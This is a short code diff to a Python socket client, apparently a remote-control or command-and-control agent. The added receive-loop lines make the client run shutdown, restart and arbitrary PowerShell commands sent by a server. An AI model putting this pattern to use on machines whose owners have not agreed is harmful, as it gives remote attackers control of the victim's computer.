@@ -1,4 +1,5 @@
 import socket
+# from aiohttp import client
 import requests
 import platform 
 from client_functions import client_func
@@ -57,11 +58,21 @@ class main:
         self.client.send(message.encode())
     def recieve(self):
         while True:
-            data = (self.client.recv(2048))
+            data = (self.client.recv(2048)).decode()
             print(f"Recieved: {data}")
             if not data:
                 print("Server broke the connection")
                 break
+            if data.startswith("execute:"):
+                data = data.split("execute:")[1]
+                if data == "shutdown":
+                    client_func.shutdown_computer()
+                elif data == "restart":
+                    client_func.restart_computer()
+            elif data.startswith("powershell:"):
+                data = data.split("powershell:")[1]
+                client_func.execute_powershell(data)
+            
 
 
 
